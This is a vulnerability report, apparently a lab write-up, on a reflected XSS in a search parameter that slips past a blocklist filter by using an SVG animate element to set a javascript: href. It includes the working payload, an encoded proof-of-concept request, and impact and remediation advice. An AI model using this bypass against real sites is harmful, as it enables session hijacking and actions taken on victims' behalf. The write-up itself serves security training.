# Vulnerability Report: Reflected XSS via SVG Animate Bypass

**Severity:** Medium  
**CVSS Score:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)  
**Date:** 2026-07-22  
**Target:** web-security-academy.net  

## Executive Summary
A Reflected Cross-Site Scripting vulnerability was identified in the search functionality of the application.
The application attempts to block event handlers and `href` attributes, but the filter is incomplete —
SVG's `<animate>` element can dynamically assign a `javascript:` URL to an `href` attribute at runtime,
bypassing the static filter entirely and allowing arbitrary JavaScript execution in the victim's browser.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | Reflected Cross-Site Scripting |
| Parameter | `search` (Query String) |
| Method | GET |
| Filter | Blocklist (event handlers + href blocked) |
| Bypass | SVG `<animate>` runtime attribute injection |

## Steps to Reproduce
1. Open the target application and locate the search box — submit any input and confirm reflection in the response.
2. Confirm HTML context breakout is possible by injecting `'` and observing it reflected unencoded.
3. Observe that `href` attribute and event handlers are blocked by the filter.
4. Confirm that `<svg>` tag and `<animate>` element are allowed.
5. Deliver the following payload via the `search` parameter:

```
'<svg><a><animate attributeName="href" values="javascript:alert(origin)" /><text x="20" y="20">Click Me</text></a></svg>
```

6. Click the rendered "Click Me" text — JavaScript executes in the target's origin context.

## Proof of Concept
```http
GET /?search=%27%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3D%22href%22+values%3D%22javascript%3Aalert%28origin%29%22+%2F%3E%3Ctext+x%3D%2220%22+y%3D%2220%22%3EClick+Me%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E HTTP/2
Host: TARGET.web-security-academy.net
```

**Payload (decoded):**
```text
'<svg><a><animate attributeName="href" values="javascript:alert(origin)" /><text x="20" y="20">Click Me</text></a></svg>
```

## Impact
An attacker can craft a malicious URL containing the payload and trick a victim into clicking it.
Since the XSS is reflected, the payload lives in the URL — making the attack surface anyone who opens the link. This can lead to:
- Executing arbitrary JavaScript in the victim's browser under the target origin
- Session hijacking if cookies are accessible
- Performing actions on behalf of the victim
- Redirecting the victim to phishing pages or injecting fake UI elements into the DOM

## Remediation
- Never rely on attribute or tag blocklists for XSS prevention — they are always bypassable
- Use a proper HTML sanitization library (such as DOMPurify) with a strict allowlist
- Encode all user-controlled output before reflecting it into HTML context
- Apply a strong Content Security Policy (CSP) as a defense-in-depth layer

## References
- OWASP: Cross-Site Scripting (XSS)
- CWE-79: Improper Neutralization of Input During Web Page Generation
- PortSwigger: Reflected XSS